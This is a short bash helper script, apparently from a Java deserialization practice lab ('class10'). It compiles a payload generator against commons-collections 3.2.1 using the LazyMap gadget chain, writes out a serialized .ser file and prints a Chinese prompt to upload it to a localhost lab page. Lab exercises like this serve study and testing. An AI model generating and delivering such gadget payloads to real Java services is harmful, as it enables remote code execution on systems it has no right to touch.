#!/bin/bash
# class10 — LazyMap
cd "$(dirname "$0")"
javac -cp "../lib/commons-collections-3.2.1.jar" GenPayload.java -d .
java -cp ".:../lib/commons-collections-3.2.1.jar" class10.GenPayload
rm -rf class10
mv *.ser .. 2>/dev/null
echo "🎯 上传 class10.ser 到 http://localhost:81/class10/"
